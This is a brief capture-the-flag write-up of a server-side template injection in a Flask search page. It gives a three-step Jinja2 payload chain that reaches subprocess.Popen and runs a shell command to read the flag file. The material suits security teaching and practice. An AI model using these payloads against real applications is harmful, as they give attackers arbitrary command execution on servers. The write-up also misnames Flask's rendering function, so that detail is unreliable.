Writeup: This is a python flask website that allows for user interaction with a search field. When the user sends a search query, the server returns the results and reflects the users' query onto the website. The server’s response is rendered using Flask’s `render_template_from_string` function. 

Given that Flask leverages Jinja2 as its templating engine, Jinja2 syntax is followed. For example, the string `<a>{{ 1 + 1 }}</a>` will be rendered as `<a>2<a>`. In this specific challenge, the vulnerable web application renders user-provided content with the render_template_from_string function, resulting in the user being able to pass arbitrary python commands. 

An attacker can read the flag in a few steps:

1. Search `{{"".__class__.__mro__[1].__subclasses__()}}` to see a list of python subclasses classes that inherit the default object (all python class in the current context).

2. Index the list of classes and find the class of choice, being subprocess.Popen. Access it by searching for `{{"".__class__.__mro__[1].__subclasses__()[223]}}`

3. Finally, read the flag by executing `{{"".__class__.__mro__[1].__subclasses__()[223]('cat flag.txt',shell=True,stdout=-1).communicate()[0]}}`